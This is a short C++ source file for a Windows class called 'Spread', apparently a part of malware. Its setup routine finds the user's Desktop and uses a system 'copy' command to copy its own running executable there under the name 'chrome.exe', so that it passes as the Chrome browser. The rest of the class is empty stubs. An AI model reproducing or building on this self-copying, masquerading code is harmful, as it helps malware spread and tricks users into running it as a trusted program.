#include "Spread.hpp"

Spread::Spread() {
}

Spread::~Spread() {
}

Spread &Spread::operator=(const Spread &obj) {
    return (*this);
}

Spread::Spread(const Spread &obj) {

}

void Spread::setup() {
	static TCHAR path[MAX_PATH + 1];
	if (SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE)) {
		this->_desktop = path;
	}

	TCHAR szFileName[MAX_PATH + 1];
	GetModuleFileName(NULL, szFileName, MAX_PATH + 1);
	this->_binName = szFileName;

	std::ostringstream cmd;
	cmd << "copy ";
	cmd << this->_binName;
	cmd << " ";
	cmd << this->_desktop;
	cmd << "\\chrome.exe";
	std::system(cmd.str().c_str());

}

void Spread::update() {
}
